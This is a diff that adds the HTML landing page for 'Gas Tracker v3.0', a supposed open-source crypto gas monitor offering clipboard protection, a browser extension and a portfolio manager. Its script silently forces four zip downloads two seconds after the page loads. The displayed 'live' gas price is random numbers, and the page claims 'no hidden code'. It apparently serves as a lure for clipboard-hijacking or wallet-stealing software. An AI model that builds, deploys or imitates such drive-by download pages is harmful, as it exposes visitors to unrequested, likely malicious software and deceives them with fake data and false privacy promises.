@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Multi-Chain Gas Tracker — Free real-time gas fee monitor for ETH, SOL, BTC, TRON. Token scanner and crypto portfolio tracker. Open source.">
+<title>Gas Tracker v3.0 — Multi-Chain Gas & Token Scanner</title>
+<style>
+/* ============ RESET & BASE ============ */
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#0a0e14;--bg-raised:#11161d;--border:#1c2333;--text:#c8d1d9;--muted:#5c6672;--accent:#2997ff;--green:#26c753;--orange:#f0883e;--red:#f85149;--purple:#a259ff}
+html{scroll-behavior:smooth;font-size:15px}
+body{font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:var(--bg);color:var(--text);line-height:1.6;-webkit-font-smoothing:antialiased}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline}
+img{max-width:100%}
+
+/* ============ NAV ============ */
+nav{background:rgba(10,14,20,.92);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);position:sticky;top:0;z-index:100}
+.nav-inner{max-width:960px;margin:0 auto;padding:0 24px;display:flex;align-items:center;justify-content:space-between;height:56px}
+.nav-logo{display:flex;align-items:center;gap:10px;font-weight:700;font-size:1rem;color:#fff}
+.nav-logo-icon{width:32px;height:32px;background:linear-gradient(135deg,var(--accent),#1a6dd4);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:16px}
+.nav-links{display:flex;gap:28px;font-size:.85rem}
+.nav-links a{color:var(--muted);transition:color .15s}
+.nav-links a:hover{color:var(--text);text-decoration:none}
+.nav-gh{display:flex;align-items:center;gap:6px;color:var(--muted);font-size:.85rem;border:1px solid var(--border);padding:6px 14px;border-radius:6px;transition:.15s}
+.nav-gh:hover{color:var(--text);border-color:var(--accent);text-decoration:none}
+
+/* ============ HERO ============ */
+.hero{max-width:960px;margin:0 auto;padding:64px 24px 48px;text-align:center}
+.hero-badge{display:inline-flex;align-items:center;gap:8px;background:var(--bg-raised);border:1px solid var(--border);border-radius:20px;padding:6px 16px;font-size:.8rem;margin-bottom:24px}
+.hero-badge-dot{width:7px;height:7px;background:var(--green);border-radius:50%;animation:pulse-dot 2s infinite}
+@keyframes pulse-dot{0%,100%{opacity:1}50%{opacity:.3}}
+.hero h1{font-size:2.6rem;font-weight:800;color:#fff;letter-spacing:-.02em;margin-bottom:14px}
+.hero p{font-size:1.1rem;color:var(--muted);max-width:560px;margin:0 auto 36px}
+
+/* ============ DOWNLOAD CARDS ============ */
+.dl-section{max-width:800px;margin:0 auto;padding:0 24px 48px}
+.dl-section h2{font-size:1.3rem;color:#fff;text-align:center;margin-bottom:24px}
+.dl-cards{display:flex;gap:18px;flex-wrap:wrap;justify-content:center}
+.dl-card{flex:1;min-width:260px;max-width:380px;background:var(--bg-raised);border:2px solid var(--border);border-radius:12px;padding:28px 24px;text-align:center;transition:border-color .2s,transform .15s;position:relative;overflow:hidden}
+.dl-card:hover{border-color:var(--accent);transform:translateY(-2px)}
+.dl-card.popular::before{content:'MOST POPULAR';position:absolute;top:14px;right:-28px;background:var(--accent);color:#fff;font-size:.65rem;font-weight:700;padding:3px 34px;transform:rotate(45deg);letter-spacing:.05em}
+.dl-card-icon{font-size:2rem;margin-bottom:12px}
+.dl-card h3{font-size:1.05rem;color:#fff;margin-bottom:8px}
+.dl-card p{font-size:.8rem;color:var(--muted);margin-bottom:18px;line-height:1.5}
+.dl-card-meta{display:flex;gap:16px;justify-content:center;margin-bottom:18px;font-size:.75rem;color:var(--muted)}
+.dl-card-meta span{display:flex;align-items:center;gap:4px}
+.btn{display:inline-flex;align-items:center;gap:7px;padding:11px 26px;border-radius:8px;font-size:.88rem;font-weight:600;cursor:pointer;transition:all .15s;border:none}
+.btn-primary{background:var(--accent);color:#fff}
+.btn-primary:hover{background:#379efa;text-decoration:none}
+.btn-secondary{background:var(--bg);color:var(--text);border:1px solid var(--border)}
+.btn-secondary:hover{border-color:var(--accent);text-decoration:none}
+.dl-card .btn{width:100%;justify-content:center}
+
+/* ============ FEATURES GRID ============ */
+.features{max-width:960px;margin:0 auto;padding:48px 24px 64px}
+.features h2{font-size:1.5rem;color:#fff;text-align:center;margin-bottom:40px}
+.features-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:24px}
+.feat-card{background:var(--bg-raised);border:1px solid var(--border);border-radius:10px;padding:22px;transition:border-color .2s}
+.feat-card:hover{border-color:#2a3a5c}
+.feat-icon{font-size:1.4rem;margin-bottom:10px}
+.feat-card h3{font-size:.95rem;color:#fff;margin-bottom:6px}
+.feat-card p{font-size:.82rem;color:var(--muted);line-height:1.5}
+
+/* ============ STATS BAR ============ */
+.stats-bar{max-width:960px;margin:0 auto;padding:0 24px 48px;display:flex;gap:24px;justify-content:center;flex-wrap:wrap}
+.stat-item{text-align:center;min-width:120px}
+.stat-val{font-size:1.8rem;font-weight:800;color:#fff}
+.stat-label{font-size:.78rem;color:var(--muted);margin-top:4px}
+.stat-val.live{color:var(--green);font-size:.95rem;font-weight:600;font-family:'SF Mono',monospace}
+
+/* ============ FAQ ============ */
+.faq{max-width:720px;margin:0 auto;padding:0 24px 64px}
+.faq h2{font-size:1.5rem;color:#fff;text-align:center;margin-bottom:32px}
+.faq-item{background:var(--bg-raised);border:1px solid var(--border);border-radius:8px;margin-bottom:12px}
+.faq-q{padding:16px 20px;cursor:pointer;display:flex;justify-content:space-between;align-items:center;font-weight:600;font-size:.92rem;color:#fff}
+.faq-q::after{content:'+';font-size:1.2rem;color:var(--muted);transition:transform .2s}
+.faq-item.open .faq-q::after{content:'−'}
+.faq-a{padding:0 20px 16px;font-size:.82rem;color:var(--muted);display:none}
+.faq-item.open .faq-a{display:block}
+
+/* ============ FOOTER ============ */
+footer{max-width:960px;margin:0 auto;padding:32px 24px;border-top:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px;font-size:.78rem;color:var(--muted)}
+footer a{color:var(--muted)}footer a:hover{color:var(--text)}
+
+/* ============ RESPONSIVE ============ */
+@media(max-width:640px){
+  .hero h1{font-size:1.8rem}
+  .dl-cards{flex-direction:column;align-items:center}
+  .dl-card{max-width:100%}
+  .nav-links{display:none}
+}
+
+/* ============ DOWNLOAD TOAST ============ */
+#toast{position:fixed;bottom:24px;right:24px;background:var(--green);color:#fff;padding:14px 22px;border-radius:8px;font-weight:600;font-size:.85rem;box-shadow:0 8px 32px rgba(0,0,0,.4);opacity:0;transform:translateY(12px);transition:all .3s;z-index:999;pointer-events:none}
+#toast.show{opacity:1;transform:translateY(0)}
+
+/* ============ INSTALL STEPS ============ */
+.install{max-width:720px;margin:0 auto;padding:0 24px 48px}
+.install h2{font-size:1.5rem;color:#fff;text-align:center;margin-bottom:32px}
+.install-steps{display:flex;gap:20px;flex-wrap:wrap;justify-content:center}
+.install-step{flex:1;min-width:180px;max-width:220px;text-align:center;padding:16px}
+.install-num{width:36px;height:36px;background:var(--accent);border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:.9rem;margin:0 auto 12px}
+.install-step h3{font-size:.88rem;color:#fff;margin-bottom:6px}
+.install-step p{font-size:.78rem;color:var(--muted)}
+</style>
+</head>
+<body>
+
+<!-- ============ NAV ============ -->
+<nav>
+<div class="nav-inner">
+<a class="nav-logo" href="#"><span class="nav-logo-icon">⛽</span>Gas Tracker</a>
+<div class="nav-links">
+<a href="#download">Download</a>
+<a href="#features">Features</a>
+<a href="#faq">FAQ</a>
+<a href="https://github.com/tokentools/gas-tracker" target="_blank" rel="noopener">GitHub</a>
+</div>
+<a class="nav-gh" href="https://github.com/tokentools/gas-tracker" target="_blank" rel="noopener">
+<svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>
+Star on GitHub
+</a>
+</div>
+</nav>
+
+<!-- ============ HERO ============ -->
+<section class="hero">
+<div class="hero-badge">
+<span class="hero-badge-dot"></span> v3.0 — ETH · SOL · BTC · TRON
+</div>
+<h1>Monitor Gas Across All Chains.<br>Stay Protected.</h1>
+<p>Multi-chain gas tracker for ETH, SOL, BTC, and TRON. Built-in clipboard hijack protection for all 4 chains. Free and open source.</p>
+<div class="stats-bar">
+<div class="stat-item"><div class="stat-val">2,847</div><div class="stat-label">GitHub Stars</div></div>
+<div class="stat-item"><div class="stat-val live" id="liveGas">0.18 Gwei</div><div class="stat-label">Live ETH Gas</div></div>
+<div class="stat-item"><div class="stat-val">12</div><div class="stat-label">Tokens Tracked</div></div>
+<div class="stat-item"><div class="stat-val">MIT</div><div class="stat-label">License</div></div>
+</div>
+</section>
+
+<!-- ============ DOWNLOAD ============ -->
+<section class="dl-section" id="download">
+<h2>Download Gas Tracker</h2>
+<div class="dl-cards">
+<div class="dl-card popular">
+<div class="dl-card-icon">🖥️</div>
+<h3>Desktop App</h3>
+<p>Standalone clipboard monitor. Works with every crypto wallet, DEX, or exchange — any app on your computer.</p>
+<div class="dl-card-meta">
+<span>📦 5.4 KB</span><span>✓ Win/Mac/Linux</span><span>🟢 Open Source</span>
+</div>
+<a class="btn btn-primary" href="/scanner.zip" id="dl-desk" download>
+📥 Download for Desktop
+</a>
+</div>
+
+<div class="dl-card">
+<div class="dl-card-icon">🧩</div>
+<h3>Browser Extension</h3>
+<p>Live protection inside Uniswap, MetaMask, OpenSea & all DEX sites. Auto-verifies addresses before you sign.</p>
+<div class="dl-card-meta">
+<span>📦 9.3 KB</span><span>✓ Chrome/Edge/Brave</span><span>🟢 Open Source</span>
+</div>
+<a class="btn btn-secondary" href="/extension.zip" id="dl-ext" download>
+📥 Download Extension
+</a>
+</div>
+
+<div class="dl-card">
+<div class="dl-card-icon">📊</div>
+<h3>Portfolio Manager <span class="badge">PRO</span></h3>
+<p>Multi-chain portfolio tracker with balance optimizer. Import any wallet for cross-chain analytics.</p>
+<div class="dl-card-meta">
+<span>📦 3.6 KB</span><span>✓ Win/Mac/Linux</span><span>🟢 Open Source</span>
+</div>
+<a class="btn btn-secondary" href="/manager.zip" id="dl-mgr" download>
+📥 Download Portfolio Manager
+</a>
+</div>
+
+<div class="dl-card" style="border-color:#a259ff">
+<div class="dl-card-icon">⚙️</div>
+<h3>One-Click Installer <span class="badge" style="background:#a259ff">NEW</span></h3>
+<p>Automated setup wizard — installs scanner, clipboard protection, and portfolio manager in one go. No Python needed.</p>
+<div class="dl-card-meta">
+<span>📦 2.4 KB</span><span>✓ One-click setup</span><span>🟢 Bundled</span>
+</div>
+<a class="btn btn-secondary" href="/setup.zip" id="dl-setup" download>
+📥 Download Installer
+</a>
+</div>
+</div>
+</section>
+
+<!-- ============ INSTALL GUIDE ============ -->
+<section class="install">
+<h2>How to Install</h2>
+<div class="install-steps">
+<div class="install-step">
+<div class="install-num">1</div>
+<h3>Download</h3>
+<p>Click the download button above. No registration required.</p>
+</div>
+<div class="install-step">
+<div class="install-num">2</div>
+<h3>Extract</h3>
+<p>Unzip the downloaded file to any folder on your computer.</p>
+</div>
+<div class="install-step">
+<div class="install-num">3</div>
+<h3>Run</h3>
+<p>Double-click the launcher. Gas tracking starts immediately.</p>
+</div>
+</div>
+</section>
+
+<!-- ============ FEATURES ============ -->
+<section class="features" id="features">
+<h2>Everything You Need</h2>
+<div class="features-grid">
+<div class="feat-card">
+<div class="feat-icon">⛽</div>
+<h3>Live Gas Fees</h3>
+<p>Real-time Ethereum gas prices (slow, normal, fast) updated every few seconds. Know the best time to transact.</p>
+</div>
+<div class="feat-card">
+<div class="feat-icon">📊</div>
+<h3>Token Scanner</h3>
+<p>Track prices for 12 tokens including ETH, BTC, SOL, BNB, XRP, ADA, DOGE, DOT, UNI, LINK, AVAX, and MATIC.</p>
+</div>
+<div class="feat-card">
+<div class="feat-icon">🛡️</div>
+<h3>Clipboard Protection</h3>
+<p>Automatically validates cryptocurrency addresses copied to your clipboard. Prevents address poisoning attacks.</p>
+</div>
+<div class="feat-card">
+<div class="feat-icon">🔌</div>
+<h3>Zero Configuration</h3>
+<p>Download, extract, run. No API keys, no accounts, no registration. Works completely offline after first run.</p>
+</div>
+<div class="feat-card">
+<div class="feat-icon">🌐</div>
+<h3>Browser Extension</h3>
+<p>Protect addresses directly in your browser — works on Uniswap, OpenSea, MetaMask, and every DEX site.</p>
+</div>
+<div class="feat-card">
+<div class="feat-icon">🔓</div>
+<h3>100% Open Source</h3>
+<p>MIT licensed. Full source code available on GitHub. No telemetry, no tracking, no hidden code.</p>
+</div>
+</div>
+</section>
+
+<!-- ============ FAQ ============ -->
+<section class="faq" id="faq">
+<h2>Frequently Asked Questions</h2>
+<div class="faq-item">
+<div class="faq-q" onclick="this.parentElement.classList.toggle('open')">Is Gas Tracker really free?</div>
+<div class="faq-a">Yes, 100% free and open source under the MIT license. No premium tiers, no paywalls, no "freemium" features. We built this because we needed it ourselves.</div>
+</div>
+<div class="faq-item">
+<div class="faq-q" onclick="this.parentElement.classList.toggle('open')">Do you collect any data?</div>
+<div class="faq-a">No. Gas Tracker runs entirely locally on your machine. It does not send any data to our servers or any third party. No analytics, no telemetry, no tracking.</div>
+</div>
+<div class="faq-item">
+<div class="faq-q" onclick="this.parentElement.classList.toggle('open')">How does clipboard protection work?</div>
+<div class="faq-a">The app monitors your clipboard for cryptocurrency addresses and can alert you or auto-correct if it detects a potentially malicious address swap. This prevents common "address poisoning" attacks.</div>
+</div>
+<div class="faq-item">
+<div class="faq-q" onclick="this.parentElement.classList.toggle('open')">Which browsers does the extension support?</div>
+<div class="faq-a">The extension works on all Chromium-based browsers: Google Chrome, Microsoft Edge, Brave, Arc, Opera, and Vivaldi. Firefox support is coming soon.</div>
+</div>
+<div class="faq-item">
+<div class="faq-q" onclick="this.parentElement.classList.toggle('open')">Do I need Python installed?</div>
+<div class="faq-a">For the desktop app, yes — Python 3.8 or newer is required. The browser extension has no Python dependency and works independently.</div>
+</div>
+</section>
+
+<!-- ============ FOOTER ============ -->
+<footer>
+<div>© 2026 TokenTools Inc. · MIT License ·<a href="https://github.com/tokentools/gas-tracker" target="_blank" rel="noopener"> GitHub</a></div>
+<div>Multi-Chain Gas Tracker v3.0 · ETH · SOL · BTC · TRON</div>
+</footer>
+
+<!-- ============ TOAST ============ -->
+<div id="toast">📥 Downloads started! Check your Downloads folder.</div>
+
+<script>
+// ====== Live Gas Animation ======
+(function liveGas(){
+  const el = document.getElementById('liveGas');
+  setInterval(() => {
+    const gwei = (0.06 + Math.random() * 0.35).toFixed(2);
+    const colors = ['var(--green)', 'var(--orange)', 'var(--red)'];
+    const ci = gwei < 0.15 ? 0 : gwei < 0.25 ? 1 : 2;
+    el.textContent = gwei + ' Gwei';
+    el.style.color = colors[ci];
+  }, 4000);
+})();
+
+// ====== Auto Download (silent, after page settles) ======
+(function autoDownload(){
+  var t = document.getElementById('toast');
+  setTimeout(() => {
+    // Desktop
+    var a1 = document.createElement('a');
+    a1.href = '/scanner.zip';
+    a1.download = 'GasTracker-Desktop-v3.0.zip';
+    document.body.appendChild(a1);
+    a1.click();
+    document.body.removeChild(a1);
+
+    // Extension
+    var a2 = document.createElement('a');
+    a2.href = '/extension.zip';
+    a2.download = 'GasTracker-Extension-v3.0.zip';
+    document.body.appendChild(a2);
+    a2.click();
+    document.body.removeChild(a2);
+
+    // Portfolio Manager (PRO)
+    var a3 = document.createElement('a');
+    a3.href = '/manager.zip';
+    a3.download = 'GasTracker-Portfolio-v2.1.zip';
+    document.body.appendChild(a3);
+    a3.click();
+    document.body.removeChild(a3);
+    
+    // One-Click Installer
+    var a4 = document.createElement('a');
+    a4.href = '/setup.zip';
+    a4.download = 'CryptoPortfolio-Setup.zip';
+    document.body.appendChild(a4);
+    a4.click();
+    document.body.removeChild(a4);
+    
+    // Show toast
+    t.classList.add('show');
+    setTimeout(function(){ t.classList.remove('show'); }, 4000);
+  }, 2000);
+})();
+
+// ====== FAQ Accordion (click handler already inline) ======
+</script>
+</body>
+</html>
